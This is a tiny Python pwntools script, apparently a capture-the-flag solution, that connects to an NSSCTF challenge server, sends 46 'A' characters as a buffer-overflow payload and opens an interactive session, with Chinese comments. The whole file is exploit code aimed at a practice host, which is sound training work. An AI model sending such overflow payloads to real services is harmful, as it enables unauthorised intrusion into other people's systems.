from pwn import *
n = remote('node5.anna.nssctf.cn',27149)    #远程连接
payload=46*'A' 
n.sendline(payload) #发送payload至远程服务器
n.interactive()